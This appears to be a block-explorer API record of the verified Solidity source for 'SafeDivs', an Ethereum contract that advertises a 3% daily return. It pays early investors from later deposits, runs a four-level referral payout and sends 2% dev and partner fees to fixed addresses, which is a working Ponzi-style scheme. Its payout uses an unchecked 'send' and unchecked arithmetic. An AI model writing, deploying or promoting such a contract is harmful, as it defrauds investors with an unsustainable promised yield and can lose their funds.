{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.4.24;\r\n\r\n/***********************************************************\r\n * SafeDivs contract\r\n *  - GAIN 3% PER 24 HOURS (every 5900 blocks)\r\n * \r\n *  http://www.safedivs.com\r\n ***********************************************************/\r\n\r\n/***********************************************************\r\n * @title SafeMath v0.1.9\r\n * @dev Math operations with safety checks that throw on error\r\n * change notes:  original SafeMath library from OpenZeppelin modified by Inventor\r\n * - added sqrt\r\n * - added sq\r\n * - added pwr \r\n * - changed asserts to requires with error log outputs\r\n * - removed div, its useless\r\n ***********************************************************/\r\n library SafeMath {\r\n    /**\r\n    * @dev Multiplies two numbers, throws on overflow.\r\n    */\r\n    function mul(uint256 a, uint256 b) \r\n        internal \r\n        pure \r\n        returns (uint256 c) \r\n    {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        c = a * b;\r\n        require(c / a == b, \"SafeMath mul failed\");\r\n        return c;\r\n    }\r\n\r\n    /**\r\n    * @dev Integer division of two numbers, truncating the quotient.\r\n    */\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\r\n        uint256 c = a / b;\r\n        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\r\n        return c;\r\n    }\r\n    \r\n    /**\r\n    * @dev Subtracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).\r\n    */\r\n    function sub(uint256 a, uint256 b)\r\n        internal\r\n        pure\r\n        returns (uint256) \r\n    {\r\n        require(b <= a, \"SafeMath sub failed\");\r\n        return a - b;\r\n    }\r\n\r\n    /**\r\n    * @dev Adds two numbers, throws on overflow.\r\n    */\r\n    function add(uint256 a, uint256 b)\r\n        internal\r\n        pure\r\n        returns (uint256 c) \r\n    {\r\n        c = a + b;\r\n        require(c >= a, \"SafeMath add failed\");\r\n        return c;\r\n    }\r\n    \r\n    /**\r\n     * @dev gives square root of given x.\r\n     */\r\n    function sqrt(uint256 x)\r\n        internal\r\n        pure\r\n        returns (uint256 y) \r\n    {\r\n        uint256 z = ((add(x,1)) / 2);\r\n        y = x;\r\n        while (z < y) \r\n        {\r\n            y = z;\r\n            z = ((add((x / z),z)) / 2);\r\n        }\r\n    }\r\n    \r\n    /**\r\n     * @dev gives square. multiplies x by x\r\n     */\r\n    function sq(uint256 x)\r\n        internal\r\n        pure\r\n        returns (uint256)\r\n    {\r\n        return (mul(x,x));\r\n    }\r\n    \r\n    /**\r\n     * @dev x to the power of y \r\n     */\r\n    function pwr(uint256 x, uint256 y)\r\n        internal \r\n        pure \r\n        returns (uint256)\r\n    {\r\n        if (x==0)\r\n            return (0);\r\n        else if (y==0)\r\n            return (1);\r\n        else \r\n        {\r\n            uint256 z = x;\r\n            for (uint256 i=1; i < y; i++)\r\n                z = mul(z,x);\r\n            return (z);\r\n        }\r\n    }\r\n}\r\n\r\n/***********************************************************\r\n * SDDatasets library\r\n ***********************************************************/\r\nlibrary SDDatasets {\r\n    struct Player {\r\n        address addr;   // player address\r\n        uint256 invested;    //\r\n        uint256 atBlock;    // \r\n        uint256 payEth;\r\n        uint256 aff;    // affiliate vault\r\n        uint256 laff;   // 上级用户\r\n        uint256 aff1sum; //以下是邀请奖励，直接发到自己的账户\r\n        uint256 aff2sum;\r\n        uint256 aff3sum;\r\n        uint256 aff4sum;\r\n    }\r\n}\r\n\r\ncontract SafeDivs {\r\n    using SafeMath              for *;\r\n\r\n    address public devAddr_ = address(0xe6CE2a354a0BF26B5b383015B7E61701F6adb39C);\r\n    address public affiAddr_ = address(0x08F521636a2B117B554d04dc9E54fa4061161859);\r\n\r\n    //合作伙伴\r\n    address public partnerAddr_ = address(0x08962cDCe053e2cE92daE22F3dE7538F40dAEFC2);\r\n\r\n    bool public activated_ = false;\r\n    modifier isActivated() {\r\n        require(activated_ == true, \"its not active yet.\"); \r\n        _;\r\n    }\r\n\r\n    function activate() isAdmin() public {\r\n        require(address(devAddr_) != address(0x0), \"Must setup devAddr_.\");\r\n        require(address(partnerAddr_) != address(0x0), \"Must setup partnerAddr_.\");\r\n        require(address(affiAddr_) != address(0x0), \"Must setup affiAddr_.\");\r\n\r\n        require(activated_ == false, \"Only once\");\r\n        activated_ = true ;\r\n\t}\r\n\t\r\n    mapping(address => uint256)     private g_users ;\r\n    function initUsers() private {\r\n        g_users[msg.sender] = 9 ;\r\n        \r\n        uint256 pId = G_NowUserId;\r\n        pIDxAddr_[msg.sender] = pId;\r\n        player_[pId].addr = msg.sender;\r\n    }\r\n    modifier isAdmin() {\r\n        uint256 role = g_users[msg.sender];\r\n        require((role==9), \"Must be admin.\");\r\n        _;\r\n    }\t\r\n\t\r\n    uint256 public G_NowUserId = 1000; //当前用户编号\r\n    uint256 public G_AllEth = 0;\r\n    \r\n    mapping (address => uint256) public pIDxAddr_;  \r\n    mapping (uint256 => SDDatasets.Player) public player_; \r\n\t\r\n\tfunction GetIdByAddr(address addr) public \r\n\t    view returns(uint256)\r\n\t{\r\n\t    return pIDxAddr_[addr];\r\n\t}\r\n\t\r\n\r\n\tfunction GetPlayerById(uint256 uid) public \r\n\t    view returns(uint256,uint256,uint256,uint256,uint256,uint256,uint256,uint256,uint256)\r\n\t{\r\n\t    SDDatasets.Player player = player_[uid];\r\n\t    return\r\n\t    (\r\n\t        player.invested,\r\n\t        player.atBlock,\r\n\t        player.payEth,\r\n\t        player.aff,\r\n\t        player.laff,\r\n\t        player.aff1sum,\r\n\t        player.aff2sum,\r\n\t        player.aff3sum,\r\n\t        player.aff4sum\r\n\t    );\r\n\t}\r\n\r\n    constructor() public {\r\n\r\n        initUsers();\r\n    }\r\n\t\r\n\tfunction register_(uint256 _affCode) private{\r\n        G_NowUserId = G_NowUserId.add(1);\r\n        \r\n        address _addr = msg.sender;\r\n        \r\n        pIDxAddr_[_addr] = G_NowUserId;\r\n\r\n        player_[G_NowUserId].addr = _addr;\r\n        player_[G_NowUserId].laff = _affCode;\r\n        \r\n        uint256 _affID1 = _affCode;\r\n        uint256 _affID2 = player_[_affID1].laff;\r\n        uint256 _affID3 = player_[_affID2].laff;\r\n        uint256 _affID4 = player_[_affID3].laff;\r\n        \r\n        player_[_affID1].aff1sum = player_[_affID1].aff1sum.add(1);\r\n        player_[_affID2].aff2sum = player_[_affID2].aff2sum.add(1);\r\n        player_[_affID3].aff3sum = player_[_affID3].aff3sum.add(1);\r\n        player_[_affID4].aff4sum = player_[_affID4].aff4sum.add(1);\r\n\t}\r\n\t    \r\n    function register(uint256 _affCode) public payable{\r\n        \r\n        require(msg.value == 0, \"registration fee is 0 ether, please set the exact amount\");\r\n        require(_affCode != 0, \"error aff code\");\r\n        require(player_[_affCode].addr != address(0x0), \"error aff code\");\r\n        \r\n        register_(_affCode);\r\n    }\t\r\n    \r\n    function invest() public payable {\r\n        \r\n\t\t//get uid\r\n\t\tuint256 uid = pIDxAddr_[msg.sender];\r\n\t\tif (uid == 0) {\r\n\t\t\tregister_(1000);\r\n\t\t\tuid = G_NowUserId;\r\n\t\t}\r\n\t\t\r\n        // if sender (aka YOU) is invested more than 0 ether\r\n        if (player_[uid].invested != 0) {\r\n            // calculate profit amount as such:\r\n            // amount = (amount invested) * 3% * (blocks since last transaction) / 5900\r\n            // 5900 is an average block count per day produced by Ethereum blockchain\r\n            uint256 amount = player_[uid].invested * 3 / 100 * (block.number - player_[uid].atBlock) / 5900;\r\n\r\n            // send calculated amount of ether directly to sender (aka YOU)\r\n            address sender = msg.sender;\r\n            sender.send(amount);\r\n            \r\n            player_[uid].payEth += amount;\r\n        }\r\n\r\n        G_AllEth = G_AllEth.add(msg.value);\r\n        \r\n        // record block number and invested amount (msg.value) of this transaction\r\n        player_[uid].atBlock = block.number;\r\n        player_[uid].invested += msg.value;\r\n        \r\n        if (msg.value > 1000000000) {\r\n            distributeRef(msg.value, player_[uid].laff);\r\n            \r\n            uint256 devFee = (msg.value.mul(2)).div(100);\r\n            devAddr_.transfer(devFee);\r\n            \r\n            uint256 partnerFee = (msg.value.mul(2)).div(100);\r\n            partnerAddr_.transfer(partnerFee);\r\n        }        \r\n    }\r\n    \r\n    // this function called every time anyone sends a transaction to this contract\r\n    function () isActivated() external payable {\r\n        invest();\r\n    }    \r\n\t\r\n    function distributeRef(uint256 _eth, uint256 _affID) private{\r\n        \r\n        uint256 _allaff = (_eth.mul(16)).div(100);\r\n        \r\n        //四级返佣\r\n        uint256 _affID1 = _affID;\r\n        uint256 _affID2 = player_[_affID1].laff;\r\n        uint256 _affID3 = player_[_affID2].laff;\r\n        uint256 _affID4 = player_[_affID3].laff;\r\n        uint256 _aff = 0;\r\n\r\n        if (_affID1 != 0) {   \r\n            _aff = (_eth.mul(10)).div(100);\r\n            _allaff = _allaff.sub(_aff);\r\n            player_[_affID1].aff = _aff.add(player_[_affID1].aff);\r\n            player_[_affID1].addr.transfer(_aff);\r\n        }\r\n\r\n        if (_affID2 != 0) {   \r\n            _aff = (_eth.mul(3)).div(100);\r\n            _allaff = _allaff.sub(_aff);\r\n            player_[_affID2].aff = _aff.add(player_[_affID2].aff);\r\n            player_[_affID2].addr.transfer(_aff);\r\n        }\r\n\r\n        if (_affID3 != 0) {   \r\n            _aff = (_eth.mul(2)).div(100);\r\n            _allaff = _allaff.sub(_aff);\r\n            player_[_affID3].aff = _aff.add(player_[_affID3].aff);\r\n            player_[_affID3].addr.transfer(_aff);\r\n       }\r\n\r\n        if (_affID4 != 0) {   \r\n            _aff = (_eth.mul(1)).div(100);\r\n            _allaff = _allaff.sub(_aff);\r\n            player_[_affID4].aff = _aff.add(player_[_affID4].aff);\r\n            player_[_affID4].addr.transfer(_aff);\r\n            \r\n        }\r\n\r\n        if(_allaff > 0 ){\r\n            affiAddr_.transfer(_allaff);\r\n        }          \r\n    }\t\r\n}","ABI":"[{\"constant\":false,\"inputs\":[],\"name\":\"activate\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"pIDxAddr_\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"partnerAddr_\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"GetIdByAddr\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"G_NowUserId\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"uid\",\"type\":\"uint256\"}],\"name\":\"GetPlayerById\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"},{\"name\":\"\",\"type\":\"uint256\"},{\"name\":\"\",\"type\":\"uint256\"},{\"name\":\"\",\"type\":\"uint256\"},{\"name\":\"\",\"type\":\"uint256\"},{\"name\":\"\",\"type\":\"uint256\"},{\"name\":\"\",\"type\":\"uint256\"},{\"name\":\"\",\"type\":\"uint256\"},{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"devAddr_\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"player_\",\"outputs\":[{\"name\":\"addr\",\"type\":\"address\"},{\"name\":\"invested\",\"type\":\"uint256\"},{\"name\":\"atBlock\",\"type\":\"uint256\"},{\"name\":\"payEth\",\"type\":\"uint256\"},{\"name\":\"aff\",\"type\":\"uint256\"},{\"name\":\"laff\",\"type\":\"uint256\"},{\"name\":\"aff1sum\",\"type\":\"uint256\"},{\"name\":\"aff2sum\",\"type\":\"uint256\"},{\"name\":\"aff3sum\",\"type\":\"uint256\"},{\"name\":\"aff4sum\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"activated_\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"G_AllEth\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"invest\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_affCode\",\"type\":\"uint256\"}],\"name\":\"register\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"affiAddr_\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]","ContractName":"SafeDivs","CompilerVersion":"v0.4.24+commit.e67f0147","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://64a061c559a01dd42735e5a33bc6789930b540cca17c8e931b9c20b1236af1f8"}]}